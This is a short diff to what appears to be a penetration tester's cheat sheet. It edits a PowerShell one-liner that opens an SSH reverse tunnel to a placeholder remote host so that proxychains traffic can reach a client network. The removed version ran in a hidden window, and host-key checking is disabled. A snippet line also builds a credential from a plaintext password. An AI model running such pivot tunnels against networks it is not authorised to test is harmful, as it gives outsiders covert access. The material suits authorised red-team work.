@@ -10,6 +10,6 @@ $scp = ConvertTo-SecureString '<password>' -AsPlainText -Force; $cred = New-Obje
 
 ### Forward proxychains traffic into client network
 ```
-Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -w hidden -c ssh -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<rhost>"
+Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -c ssh -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<rhost>"
 ```
 
